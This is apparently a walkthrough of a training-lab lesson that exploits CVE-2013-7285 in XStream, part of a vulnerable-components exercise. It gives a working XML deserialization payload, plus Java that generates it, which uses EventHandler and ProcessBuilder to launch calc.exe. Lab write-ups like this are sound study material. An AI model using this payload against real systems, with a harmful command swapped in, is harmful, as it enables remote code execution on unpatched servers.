# (A9) Vulnerable Components

## Lesson 12 - Exploiting CVE-2013-7285 (XStream)
This lesson is a bit unclear. Basically, the goal is to exploit
[CVE-2013-7285](https://nvd.nist.gov/vuln/detail/CVE-2013-7285). You can finish it with this payload:
```xml
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>calc.exe</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```
- `<sorted-set>` is deserialized by XStream as `java.util.SortedSet`
- We are adding 2 objects to this `SortedSet`:
    - a string `foo`
    - a dynamic proxy (handled by XStream)
    
This is pretty much the same in Java code:
```
Set<Comparable> set = new TreeSet<Comparable>();
set.add("foo");
set.add(EventHandler.create(Comparable.class, new ProcessBuilder("calc.exe"), "start"));
String payload = xstream.toXML(set);
System.out.println(payload);
```
   
You can read more about it here:
- http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/
- https://www.baeldung.com/java-xstream-remote-code-execution